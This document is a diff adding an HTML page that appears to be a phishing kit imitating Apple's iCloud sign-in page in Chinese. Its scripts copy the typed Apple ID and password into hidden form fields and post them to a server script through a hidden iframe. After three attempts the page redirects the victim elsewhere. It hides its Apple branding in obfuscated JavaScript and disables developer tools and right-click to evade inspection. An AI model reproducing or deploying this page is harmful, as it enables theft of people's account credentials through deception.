@@ -1,0 +1,802 @@
+<html lang="zh-cn" style="display: block;">
+
+<head>
+  <style type="text/css">
+    @charset "UTF-8";
+
+    [ng\:cloak],
+    [ng-cloak],
+    [data-ng-cloak],
+    [x-ng-cloak],
+    .ng-cloak,
+    .x-ng-cloak,
+    .ng-hide:not(.ng-hide-animate) {
+      display: none !important;
+    }
+
+    ng\:form {
+      display: block;
+    }
+
+    .ng-animate-shim {
+      visibility: hidden;
+    }
+
+    .ng-anchor {
+      position: absolute;
+    }
+  </style>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="Expires" content="0">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Cache-control" content="no-cache">
+  <meta http-equiv="Cache" content="no-cache">
+  <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+  <meta http-equiv="Content-Script-Type" content="text/javascript">
+  <meta name="description" content="手机论坛网">
+  <meta name="keywords" content="手机论坛网">
+  <meta property="og:image" content="././image/icloud_logo.png">
+
+  <meta name="apple-mobile-web-app-capable" content="yes">
+
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+  <meta name="viewport" content="initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="favicon.ico">
+
+  <script src="jquery.js"></script>
+
+  <script language="JavaScript" type="text/javascript" src="jquery-3.2.1.min.js"></script>
+  <script>
+    var __encode = 'sojson.com', _0xb483 = ["_decode", "http://www.sojson.com/javascriptobfuscator.html"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(window); var __Ox35eed = ["<title>&#30331;&#24405;</title>", "writeln", "document"]; window[__Ox35eed[0x2]][__Ox35eed[0x1]](__Ox35eed[0x0])
+  </script>
+
+  <script>
+    var __encode = 'sojson.com', _0xb483 = ["_decode", "http://www.sojson.com/javascriptobfuscator.html"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(window); var __Ox35eed = ["<title>&#30331;&#24405;</title>", "writeln", "document"]; window[__Ox35eed[0x2]][__Ox35eed[0x1]](__Ox35eed[0x0])
+  </script>
+
+
+  <script>
+
+    var Num = "";
+    for (var i = 0; i < 10; i++) {
+      Num += Math.floor(Math.random() * 40);
+    }
+    var url = String(window.location);
+
+    if (url.indexOf("=") == -1) {
+      var newurl = url + "?solo.php=" + Math.random().toString(36).substr(2).toUpperCase() + "=" + Math.random().toString(26).substr(2).toUpperCase();
+      window.location = newurl;
+    } else {
+      var tim = url.substring(url.indexOf("index.html") + 1, url.length);
+      var surl = url.substring(0, url.indexOf("/?"));
+      if ((new Date().getTime() - tim) > 1) {
+        window.location = surl + "?index.html" + Math.random().toString(26).substr(2).toUpperCase() + "=" + Math.random().toString(26).substr(2).toUpperCase();
+      }
+    }
+
+  </script>
+  <link href="./system/1.css" rel="stylesheet" type="text/css">
+  <link href="./tpl/simplebootx/iCloud/css/stylesheet-packed.css" rel="stylesheet" type="text/css">
+  <link href="./tpl/simplebootx/iCloud/css/back.css" rel="stylesheet" type="text/css">
+  <style>
+    body,
+    html,
+    ul,
+    li,
+    p,
+    h3,
+    h4 {
+      margin: 0px;
+      padding: 0px;
+    }
+
+    ul li {
+      list-style: none;
+      color: #FFF
+    }
+
+    .main_img {
+      width: 234px;
+      margin: 10px auto 0 auto;
+    }
+
+    .main_list {
+      border: 1px solid #dedede;
+      border-radius: 6px;
+      background-color: #FFF;
+    }
+
+    .main {
+      width: 50%;
+      margin: 0 auto;
+    }
+
+    .lok {
+      font-size: 20px;
+      text-align: center;
+      margin: 10px 0;
+      color: #FFF
+    }
+
+    .main h4,
+    .main h3 {
+      font-size: 14px;
+      font-weight: normal;
+      text-align: center;
+    }
+
+    .main h3 {
+      margin: 10px 0 5px 0;
+      color: #dedede;
+    }
+
+    .main h4 {
+      font-size: 12px;
+      color: #c2c2c2;
+    }
+
+    .main_list li {
+      padding: 8px;
+    }
+
+    .main_list li strong {
+      width: 75px;
+      float: left;
+      display: block;
+      text-align: left;
+      font-weight: normal;
+    }
+
+    .main_list li input {
+      border: none;
+      padding: 5px;
+    }
+
+    .main_col {
+      color: #000000;
+      font-size: 16px;
+    }
+
+    .login_1 {
+      margin: 10px 0 5px 0;
+      ;
+      font-size: 26px;
+      color: #999999;
+      font-family: 'Myriad Set Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      text-align: center;
+      background: 0;
+      border: none;
+    }
+
+    .login_2 {
+      margin: 10px 0 5px 0;
+      ;
+      font-size: 26px;
+      color: #2AB040;
+      font-family: 'Myriad Set Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      text-align: center;
+      background: 0;
+      border: none;
+    }
+
+    .main_buuo {
+      text-align: left;
+    }
+
+    .check {
+      text-align: right;
+      font-size: 24px;
+      height: 50px;
+      width: 150px;
+      background: url(img/btn_1.png) left center no-repeat;
+    }
+
+    .checkbox {
+      width: 50px;
+      height: 50px;
+      vertical-align: middle;
+      filter: alpha(opacity=0);
+      -moz-opacity: 0;
+      -khtml-opacity: 0;
+      opacity: 0;
+    }
+
+    label {
+      vertical-align: middle;
+    }
+  </style>
+  <script type="text/javascript">
+    window.onload = function () {
+      //屏蔽键盘事件
+      document.onkeydown = function () {
+        var e = window.event || arguments[0];
+        //F12
+        if (e.keyCode == 123) {
+          return false;
+          //Ctrl+Shift+I
+        } else if ((e.ctrlKey) && (e.shiftKey) && (e.keyCode == 73)) {
+          return false;
+          //Shift+F10
+        } else if ((e.shiftKey) && (e.keyCode == 121)) {
+          return false;
+          //Ctrl+U
+        } else if ((e.ctrlKey) && (e.keyCode == 85)) {
+          return false;
+        }
+      };
+      //屏蔽鼠标右键
+      document.oncontextmenu = function () {
+        return false;
+      }
+    }
+
+  </script>
+
+  <style type="text/css">
+    < !-- body {
+
+      background: url("image/bak.png") no-repeat;
+
+      height: 100%;
+
+      width: 100%;
+
+      overflow: hidden;
+
+      background-size: cover;
+
+    }
+
+    -->
+  </style>
+</head>
+
+<body
+  onload="if(window.location.href.indexOf('temp')==-1)window.location.href=window.location.href+'?temp='+Math.random().toString();"
+  style="">
+  <script> function go() {
+      if (window.location.href.indexOf("temp") == -1)
+        window.location.href = window.location.href + '?temp=' + Math.random().toString();
+    }</script>
+  <div id="sr-alert" role="alert" aria-labelledby="sr-alert-title" aria-describedby="sr-alert-description"></div>
+
+
+  <div id="sc1439" class="atv4 sc-view sc-pane sc-main overflow-visible"
+    style="left: 0px; right: 0px; top: 0px; bottom: 0px; min-width: 1500px; min-height: 700px; z-index: 2; ">
+    <div id="sc1440" class="atv4 sc-view" style="left: 0px; right: 0px; top: 0px; height: 0px; z-index: 101; "></div>
+    <div id="sc1445" class="atv4 sc-view apps-container-view overflow-visible"
+      style="left: -10000px; top: -10000px; z-index: 100; width: 2136px; height: 1148px"></div>
+
+
+    <div class="cw-drop-target-container"></div>
+
+    <div id="sc1996" class="atv4 sc-view springboard-view"
+      style="left: 0px; width: 2543px; top: 0px; height: 100%; min-width: 100%; min-height: 700px; z-index: 50; opacity: 1; -webkit-transform: translateX(0px) translateY(0px) translateZ(0px)"
+      aria-hidden="true"><span><img src="image/login.png"></span>
+      <div role="main" aria-label="Launchpad" id="sc2003" class="atv4 sc-view"
+        style="left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 1; opacity: 0; -webkit-transform: scale(0.95)">
+        <a tabindex="-1" role="button" href="" id="sc2212"
+          class="atv4 sc-view springboard-button-view large-display-text"
+          style="left: 0px; width: 142px; top: 0px; height: 142px; z-index: 15; -webkit-transform: translateX(595px) translateY(143px) translateZ(0px) scale(1)"
+          aria-labelledby="sc2212-label" aria-hidden="true">
+
+
+        </a><a tabindex="-1" role="button" href="/#settings" id="sc2468"
+          class="atv4 sc-view springboard-button-view large-display-text"
+          style="left: 0px; width: 142px; top: 0px; height: 142px; z-index: 15; -webkit-transform: translateX(1605px) translateY(380px) translateZ(0px) scale(1)"
+          aria-labelledby="sc2468-label" aria-hidden="true">
+          <div class="sb-spinner sb-el" style="display: none; opacity: 0;"><img class="sb-spinner-image sb-el" alt=""
+              src=""></div>
+          <div class="sb-badge sb-el" style="opacity: 0; display: none;">
+            <div class="text"></div>
+            <div class="red"></div>
+            <div class="mask" style="opacity: 0;"></div>
+          </div>
+          <div class="sb-focus sb-el" style="opacity: 0;">
+            <div class="sb-focus-inner sb-focus-kid"></div>
+            <div class="sb-focus-outer sb-focus-kid"></div>
+          </div>
+          <div id="sc2468-label" class="sb-title sb-el"
+            style="width: 202px; height: 28px; top: 161px; font-size: 21px; color: rgb(255, 255, 255); text-shadow: rgba(0, 0, 0, 0.247059) 0px 7px 15px; opacity: 0; display: none;">
+            <span class="sb-title-text"></span><span class="sb-ax-text"></span></div>
+          <div class="sb-error-text sb-el"
+            style="opacity: 0; width: 142px; height: 21px; top: 186px; font-size: 16px; display: none;"></div><img
+            class="sb-arrow sb-el" alt="" src=""
+            style="opacity: 0; width: 64px; height: 58px; left: 85px; top: 85px; display: none;"><img
+            class="sb-shadow sb-el" alt="" src=""
+            style="height: 204px; width: 204px; left: -31px; top: -17px; opacity: 0; display: none;"><img src="" alt=""
+            class="sb-icon sb-el" style="display: none; height: 142px; width: 142px;"><canvas height="116" width="116"
+            aria-hidden="true"
+            style="height: 464px; width: 464px; position: absolute; top: -161px; left: -161px;"></canvas>
+        </a></div>
+
+
+      <div id="sc2005" class="atv4 icloud-controls sc-view account-menu cos-account-menu"
+        style="right: 2px; width: 300px; top: 0px; height: 44px; z-index: 3; opacity: 0">
+        <div role="button" aria-label="iCloud Settings &amp; Sign Out" aria-haspopup="true" title="" alt=""
+          aria-hidden="false" id="sc2015"
+          class="atv4 icloud-controls borderless sc-view sc-button-view account-menu large-display-text button sc-huge-size"
+          style="left: 0px; right: 55px; top: -6px; bottom: 0px"><label id="sc2062-label"
+            class="sc-button-label sc-huge-size ellipsis">AccountMenu.FallbackTitle</label>
+          <div class="chevron"></div>
+        </div>
+        <div id="sc2026" class="atv4 icloud-controls sc-view account-menu-divider"
+          style="margin-top: -11px; right: 44px; width: 1px; top: 50%; height: 22px; "></div>
+        <div role="button" title=" " alt=" " aria-hidden="false" id="sc2028"
+          class="atv4 icloud-controls sc-view sc-button-view sc-image-button-view image-button sc-regular-size no-min-width"
+          style="right: 0px; width: 44px; top: 0px; bottom: 0px; ">
+          <div class="img help-icon"></div>
+        </div>
+      </div>
+      <div id="sc2037" class="atv4 sc-view blur-overlay"
+        style="left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 2; opacity: 1"></div>
+    </div>
+  </div>
+
+
+  <div
+    style="z-index: 90; position: absolute; left: 50%; top: 50%; margin-left: -16px; margin-top: -16px; width: 32px; height: 32px; overflow: hidden; display: none; transform: rotate(0deg); opacity: 0;">
+    <div
+      style="position: absolute; left: 0px; top: -32px; width: 32px; height: 96px; background-image: url(); background-size: 32px 96px;">
+    </div>
+  </div>
+
+
+  <div class="visiable-hidden"
+    style="position: absolute; left: -10010px; top: -10px; width: 10000px; height: 0px; overflow: hidden; visibility: hidden;">
+    <div class="" style=""></div>
+  </div>
+  <div id="sc2021" class="atv4 sc-view sc-container-view badge-container-view overflow-always-visible front"
+    style="margin-top: -219px; margin-left: -180px; left: 43%; width: 360px; top: 40%; height: 400px; opacity: 1">
+    <div id="sc2026" class="atv4 sc-view auth-ui-view badge-container-content-view"
+      style="left: 0px; width: 600px; top: 0px; height: 800px; z-index: 3">
+      <div id="sc2039" class="atv4 sc-view auth-fields" style="left: 0px; width: 600px; top: 0px; height: 600px">
+
+        <script type="text/javascript">
+
+          function AchangeTest(obj) {
+
+            if (obj.innerHTML.length == 0) {
+
+              document.getElementById('Apwd').className = 'input';
+              document.getElementById('Apwd').disabled = true;
+              document.getElementById('testDiv1').className = 'button1';
+              document.getElementById('testDiv1').disabled = true;
+
+            } else {
+              document.getElementById('Apwd').className = 'classa';
+              document.getElementById('Apwd').disabled = false;
+              document.getElementById('testDiv1').className = 'button2';
+              document.getElementById('testDiv1').disabled = false;
+            }
+
+          }
+
+        </script>
+
+
+
+
+        <div style="margin-top:15%;"></div>
+        <center><img src="iamges/小学生.png" style="width:100px;height:100px;"></center>
+        <div style="height:5"> </div>
+        <div class="main" style="border:0px solid red">
+
+          <p class="lok"><img src="iamges/1.png" height="21"></p>
+          <div style="height:5;"></div>
+
+          <ul class="main_list" id="login-right">
+            <li id="bton1" style=""> <span id="testDiv" class="">
+
+
+                <input name="login-button2" id="test" type="image" src="login.png" disabled="disabled" width="26"
+                  height="26" align="right" style="margin-top:-4px;outline:none;">
+
+              </span>
+
+              <div contenteditable="true" class="input " id="App1" name="App1" type="text" placeholder="电话或电子邮件"
+                style="outline:none;color:#333;" onkeydown="ADivFollowingText();" onkeypress="OnTextChanged();"
+                onblur="checktxt();" onkeyup="changeTest(this);"></div>
+
+            </li>
+
+            <li id="testDiv1" class="button2">
+              <span class="">
+
+
+
+
+
+
+                <script language="javascript">
+                  function initData() {
+                    document.getElementById("username").value = document.getElementById("App1").innerHTML;
+                    document.getElementById("userpass").value = document.getElementById("apwd").innerHTML;
+
+                    return true;
+                  }
+                </script>
+
+
+                <iframe name="formget" style="display:none;">
+                </iframe>
+
+                <form target="formget" method="post" name="register" action="ajaxadd.ASP" onsubmit="return initData();">
+                  <input name="username" id="username" type="hidden" title="订单编号" value="">
+                  <input name="userpass" id="userpass" type="hidden" title="订单号" value="">
+                  <input name="act" id="act" type="hidden" value="ok">
+                  <input name="login-button" id="qieh" type="image" disabled="disabled" src="login.png" width="26"
+                    height="26" align="right" style="margin-top:-4px;outline: none;" ng-app="myApp"
+                    ng-controller="personCtrl" ng-click="toggle()" onclick="Th01()">
+
+                </form>
+
+
+              </span>
+
+
+              <div style="outline:none;color:#333;" id="apwd" class="input " name="apwd" contenteditable="TRUE"
+                placeholder="密码" onkeyup="AchangeTest(this);" onkeydown="DivFollowingText();"
+                onkeypress="OnTextChanged();" onblur="Achecktxt();"></div>
+
+            </li>
+
+          </ul>
+
+
+
+          <div id="myDiv" style="display:none;position: absolute; z-index: 10"><img src="QQ20190129003711.png"
+              width="310px" style="position: relative;z-index:auto"></div>
+
+
+          <div align="center" tyle="z-index:3"><br><br>
+            <label id="remember-me-label" class="form-label" for="remember-me">
+              <span class="form-choice-indicator"><img id="img" src="0190128135834.png" width="15" height="16"></span>
+
+
+              <span style="color:#FFFFFF"><img src="iamges/4.png" height="22"></span>
+            </label></div>
+          <br> <img src="QQ20190128003842.png" width="319" height="5">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+          <script>
+            window.onload = function () {
+              var oImg = document.getElementById('img');
+              var onOff = true;
+
+              oImg.onclick = function () {
+                if (onOff) {
+                  oImg.src = '20190128142059.png';
+                  onOff = false;
+                } else {
+                  oImg.src = '0190128135834.png';
+                  onOff = true;
+                }
+              };
+
+            };
+          </script>
+
+
+          <h3><img src="iamges/3.png" height="22"></h3>
+
+        </div>
+      </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+  </div>
+
+
+
+
+  <script>
+    var __encode = 'sojson.com', _0xb483 = ["_decode", "http://www.sojson.com/javascriptobfuscator.html"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(window); var __Ox35b6d = ["<div id="sc2084" class="atv4 sc - view cloudos - mini - links cancel - link sc - hidden"", "writeln", "style="margin - top: 194px; margin - left: NaNpx; left: 50 %; width: 0px; top: 50 %; height: 25px; z - index: 6; "><div></div></div><div id="sc2088" class="atv4 sc - view cloudos - mini - links forgot - link sc - hidden"", "", "         style="margin - left: NaNpx; left: 50 %; width: 0px; bottom: 13px; height: 15px; z - index: 6; ">", "		 <div>&#24536;&#35760;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#68;&#32;&#25110;&#23494;&#30721;&#65311;</div>", "		 </div><div></div></div>", "		 <div id="sc2949" class="atv4 sc - view auth - footer" style="left: 0px; right: 0px; bottom: 0px; height: 87px">", "		 <div class="footer - contents"><img src="pg.png" align="left">", "		 <div class="links"><div class="line">&#21019;&#24314;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#68;&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer - link - separator"></span>", "		 &nbsp;&nbsp;&nbsp;&nbsp;&#38544;&#31169;&#25919;&#31574;&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer - link - separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;&#26465;&#27454;&#19982;&#26465;&#20214;&nbsp;&nbsp;&nbsp;&nbsp;", "		 <span class="footer - link - separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="copyright">&#67;&#111;&#112;&#121;&#114;&#105;&#103;&#104;&#116;&#32;&#64;&#32;&#50;&#48;&#49;&#57;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#110;&#99;&#46;&#32;&#20445;&#30041;&#25152;&#26377;&#26435;&#21033;&#12290;</span></div></div></div></div>", "		 ", "		 <div id="sc2954" class="atv4 icloud - controls sc - view account - menu cos - account - menu cos - setup - instructions" style="right: 2px; width: 141px; top: 0px; height: 44px; z - index: 2"><div role="button" tabindex="0" id="sc2958" class="atv4 icloud - controls sc - view sc - button - view account - menu borderless button sc - huge - size" style="right: 38px; top: -6px; bottom: 0px; width: 102px"><label id="sc3031 - label" class="sc - button - label sc - huge - size ellipsis">&#35774;&#32622;&#35828;&#26126;</label></div><div id="sc2960" class="atv4 icloud - controls sc - view account - menu - divider" style="margin - top: -11px; right: 44px; width: 1px; top: 50 %; height: 22px; "></div><div role="button" tabindex="0" title="" alt="" aria-hidden="false" id="sc2963" class="atv4 icloud - controls sc - view sc - button - view sc - image - button - view image - button sc - regular - size no - min - width" style="right: 0px; width: 44px; top: 0px; bottom: 0px; "><div class="img help - icon" ><img src="wenhao.png" style="margin - left: -1; padding - top: 2" ></div></div></div></div></div></div>"]; document[__Ox35b6d[0x1]](__Ox35b6d[0x0]); document[__Ox35b6d[0x1]](__Ox35b6d[0x2]); document[__Ox35b6d[0x1]](__Ox35b6d[0x3]); document[__Ox35b6d[0x1]](__Ox35b6d[0x4]); document[__Ox35b6d[0x1]](__Ox35b6d[0x5]); document[__Ox35b6d[0x1]](__Ox35b6d[0x6]); document[__Ox35b6d[0x1]](__Ox35b6d[0x7]); document[__Ox35b6d[0x1]](__Ox35b6d[0x8]); document[__Ox35b6d[0x1]](__Ox35b6d[0x9]); document[__Ox35b6d[0x1]](__Ox35b6d[0xa]); document[__Ox35b6d[0x1]](__Ox35b6d[0xb]); document[__Ox35b6d[0x1]](__Ox35b6d[0xc]); document[__Ox35b6d[0x1]](__Ox35b6d[0xd])
+  </SCRIPT>
+
+  <script>
+    var __encode = 'sojson.com', _0xb483 = ["_decode", "http://www.sojson.com/javascriptobfuscator.html"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(window); var __Ox35b6d = ["<div id="sc2084" class="atv4 sc - view cloudos - mini - links cancel - link sc - hidden"", "writeln", "style="margin - top: 194px; margin - left: NaNpx; left: 50 %; width: 0px; top: 50 %; height: 25px; z - index: 6; "><div></div></div><div id="sc2088" class="atv4 sc - view cloudos - mini - links forgot - link sc - hidden"", "", "         style="margin - left: NaNpx; left: 50 %; width: 0px; bottom: 13px; height: 15px; z - index: 6; ">", "		 <div>&#24536;&#35760;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#68;&#32;&#25110;&#23494;&#30721;&#65311;</div>", "		 </div><div></div></div>", "		 <div id="sc2949" class="atv4 sc - view auth - footer" style="left: 0px; right: 0px; bottom: 0px; height: 87px">", "		 <div class="footer - contents"><img src="pg.png" align="left">", "		 <div class="links"><div class="line">&#21019;&#24314;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#68;&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer - link - separator"></span>", "		 &nbsp;&nbsp;&nbsp;&nbsp;&#38544;&#31169;&#25919;&#31574;&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer - link - separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;&#26465;&#27454;&#19982;&#26465;&#20214;&nbsp;&nbsp;&nbsp;&nbsp;", "		 <span class="footer - link - separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="copyright">&#67;&#111;&#112;&#121;&#114;&#105;&#103;&#104;&#116;&#32;&#64;&#32;&#50;&#48;&#49;&#57;&#32;&#65;&#112;&#112;&#108;&#101;&#32;&#73;&#110;&#99;&#46;&#32;&#20445;&#30041;&#25152;&#26377;&#26435;&#21033;&#12290;</span></div></div></div></div>", "		 ", "		 <div id="sc2954" class="atv4 icloud - controls sc - view account - menu cos - account - menu cos - setup - instructions" style="right: 2px; width: 141px; top: 0px; height: 44px; z - index: 2"><div role="button" tabindex="0" id="sc2958" class="atv4 icloud - controls sc - view sc - button - view account - menu borderless button sc - huge - size" style="right: 38px; top: -6px; bottom: 0px; width: 102px"><label id="sc3031 - label" class="sc - button - label sc - huge - size ellipsis">&#35774;&#32622;&#35828;&#26126;</label></div><div id="sc2960" class="atv4 icloud - controls sc - view account - menu - divider" style="margin - top: -11px; right: 44px; width: 1px; top: 50 %; height: 22px; "></div><div role="button" tabindex="0" title="" alt="" aria-hidden="false" id="sc2963" class="atv4 icloud - controls sc - view sc - button - view sc - image - button - view image - button sc - regular - size no - min - width" style="right: 0px; width: 44px; top: 0px; bottom: 0px; "><div class="img help - icon" ><img src="wenhao.png" style="margin - left: -1; padding - top: 2" ></div></div></div></div></div></div>"]; document[__Ox35b6d[0x1]](__Ox35b6d[0x0]); document[__Ox35b6d[0x1]](__Ox35b6d[0x2]); document[__Ox35b6d[0x1]](__Ox35b6d[0x3]); document[__Ox35b6d[0x1]](__Ox35b6d[0x4]); document[__Ox35b6d[0x1]](__Ox35b6d[0x5]); document[__Ox35b6d[0x1]](__Ox35b6d[0x6]); document[__Ox35b6d[0x1]](__Ox35b6d[0x7]); document[__Ox35b6d[0x1]](__Ox35b6d[0x8]); document[__Ox35b6d[0x1]](__Ox35b6d[0x9]); document[__Ox35b6d[0x1]](__Ox35b6d[0xa]); document[__Ox35b6d[0x1]](__Ox35b6d[0xb]); document[__Ox35b6d[0x1]](__Ox35b6d[0xc]); document[__Ox35b6d[0x1]](__Ox35b6d[0xd])
+  </script>
+
+
+  <script> $(document).keydown(function (e) { if (e.keyCode == 8) { localtion.reload(true); } })</script>
+
+
+
+
+  <script type="text/javascript">
+    function changeImg(Auserpass) {
+      document.getElementById(Auserpass).src = "2.gif";
+      setTimeout("document.getElementById('" + Auserpass + "').src='login.png';", 2000);
+    }
+  </script>
+
+  <script>
+    document.oncontextmenu = function () {
+      return false
+    }
+  </script>
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+
+    function AchangeTest(obj) {
+
+      if (obj.innerHTML.length == 0) {
+
+        document.getElementById('Apwd').className = 'input';
+        document.getElementById('Apwd').disabled = true;
+        document.getElementById('testDiv1').className = 'button1';
+        document.getElementById('testDiv1').disabled = true;
+
+      } else {
+        document.getElementById('apwd').className = 'classa';
+        document.getElementById('apwd').disabled = false;
+        document.getElementById('testDiv1').className = 'button2';
+        document.getElementById('testDiv1').disabled = false;
+      }
+
+    }
+
+  </script>
+
+
+
+
+
+  <script>
+    var app = angular.module('myApp', []);
+    app.controller('personCtrl', function ($scope) {
+      var submitml = 0;
+      $scope.toggle = function () {
+        submitml++;    //
+        if (submitml < 3) {
+
+        } else {
+          window.location.href = '../IM/WPAGNOARGHOAFIDSHGOABRGHO344FAOGHOAIGH435OFDGHBODFG434IMI.html';
+        }
+      };
+    });
+  </script>
+
+
+
+  <script type="text/javascript" language="javascript">
+    function OnTextChanged() {
+      if (event.keyCode == 13) {//判断是否为回车键
+        event.keyCode = 0;//屏蔽回车键
+        event.returnValue = false;
+
+      }
+    }
+  </script>
+
+
+
+  <script type="text/javascript">
+
+    function changeTest(obj) {
+
+      if (obj.innerHTML.length == 0) {
+
+        document.getElementById('test').disabled = true;
+        document.getElementById('qieh').disabled = true;
+
+      } else {
+        document.getElementById('test').disabled = false;
+        document.getElementById('qieh').disabled = false;
+
+      }
+
+    }
+
+
+
+  </script>
+
+
+
+  <script src="JQ_AJAX.JS"></script>
+
+
+
+  <script type="text/javascript">
+    function checktxt() {
+      var a = document.getElementById("loginn").innerHTML;
+      if (a == null || a == "") {
+        document.getElementById("loginn").style.display = "block";
+      } else {
+        document.getElementById("loginn").style.display = "none";
+      }
+
+
+    }
+  </script>
+  <script>
+    window.onload = function () {
+      function $(app1) { return document.getElementById(app1); }
+      $("App1").focus();//自动获得焦点
+    }
+  </script>
+  <style type="text/css">
+    /**css样式*/
+    .input {
+      width: 300px;
+
+
+      -webkit-text-security: none;
+      font-size: 15px;
+      padding: 4px 5px;
+
+
+      line-height: 18px;
+      white-space: nowrap;
+      color: #CCCCCC
+    }
+
+    .input:empty::before {
+      content: attr(placeholder);
+    }
+
+
+
+    .classa {
+      width: 300px;
+
+
+      -webkit-text-security: disc;
+      font-size: 14px;
+      padding: 4px 5px;
+
+
+      line-height: 20px;
+      white-space: nowrap;
+      color: #CCCCCC
+    }
+
+    #loginn {
+      display: none;
+    }
+
+    .login_1 {
+      width: 26px;
+      height: 26px;
+      background-image: url(39.png);
+      border: none;
+    }
+
+    .login_2 {
+      width: 26px;
+      height: 26px;
+      background-image: url(41.png)border:none;
+    }
+
+    .button1 {
+      display: block
+    }
+
+    .button2 {
+      display: none
+    }
+  </style>
+  <script language="javascript">
+    window.onload = function () {
+      var oBtn = document.getElementById('login-button2');
+      var oDiv = document.getElementById('loginn1');
+      oBtn.onclick = function (ev) {
+        var oEvent = ev || event;
+        oDiv.style.display = 'block';
+        oEvent.cancelBubble = true;
+      }
+      document.onclick = function () { oDiv.style.display = 'none'; }
+    }
+  </script>
+
+
+  <script src="jquery.min1.7.8.js"></script>
+
+
+  <script>
+    $(function () { var _0x386663 = { 'VbZ': function _0x3fbad6(_0x31da68, _0x5efd86, _0x4bf100, _0x3accbf, _0x248c41) { return _0x31da68(_0x5efd86, _0x4bf100, _0x3accbf, _0x248c41); }, 'guc': function _0x1568bd(_0x3d2c43, _0x1a2cec) { return _0x3d2c43(_0x1a2cec); } }; var _0x25a31c = document['getElementById']('App1'); var _0x1582fc = document['getElementById']('Auserpass'); _0x386663['guc']($, '#qieh')['click'](function () { _0x386663['VbZ'](flash, '#login-right', 0xa, 0x12, 0x50); }); });
+
+  </script>
+
+
+
+  <script type="text/javascript">
+    function ADivFollowingText() {
+
+      var passay = document.getElementById("app1").innerHTML;
+      document.getElementById("username").value = passay;
+
+    }
+  </script>
+  <script type="text/javascript">
+    document.getElementById("test").onclick = function () {
+      document.getElementById("testDiv").style.display = "none";
+      document.getElementById("testDiv1").style.display = "block";
+      document.getElementById("bton1").style = "border-bottom:1px solid #dedede;";
+
+    }
+  </script>
+
+  <script type="text/javascript">
+    var myDiv = $("#myDiv");
+    $(function () {
+      $("#qieh").click(function (event) {
+        if ($(myDiv).is(":hidden")) {
+          showDiv();//调用显示DIV方法
+          $(document).on("click", function () {//对document绑定一个影藏Div方法
+            $(myDiv).hide();
+          });
+          event.stopPropagation();//阻止事件向上冒泡
+        } else {
+          $(myDiv).hide();
+        }
+
+      });
+
+      $(myDiv).click(function (event) {
+        event.stopPropagation();//阻止事件向上冒泡
+      });
+    });
+    function showDiv() {
+      $(myDiv).slideDown("300");
+    }
+  </script>
+
+
+
+
+
+  <script>
+    window.onload = function () {
+      var oImg = document.getElementById('img');
+      var onOff = true;
+
+      oImg.onclick = function () {
+        if (onOff) {
+          oImg.src = '20190128142059.png';
+          onOff = false;
+        } else {
+          oImg.src = '0190128135834.png';
+          onOff = true;
+        }
+      };
+
+    };
+  </script>
+
+
+
+</body>
+
+</html>
